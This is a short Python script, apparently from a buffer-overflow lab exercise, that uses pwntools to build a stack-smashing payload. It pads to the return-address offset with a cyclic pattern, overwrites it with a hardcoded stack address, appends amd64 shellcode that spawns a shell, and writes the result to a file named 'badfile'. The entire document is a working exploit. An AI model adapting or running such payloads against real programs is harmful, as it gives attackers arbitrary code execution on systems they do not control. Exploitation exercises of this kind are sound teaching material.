#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.os = "linux"

payload = cyclic(cyclic_find(0x61616167)).encode()
sh_code = shellcraft.amd64.linux.sh()
# GDB address:      0x7fffffffe2f0
# No GDB address:    0x7fffffffe370
payload += p64(0x7fffffffe370)
#payload += asm(shellcraft.nop()* 512)
payload += asm(sh_code)

f = open("badfile", "wb")
f.write(payload)
f.close()
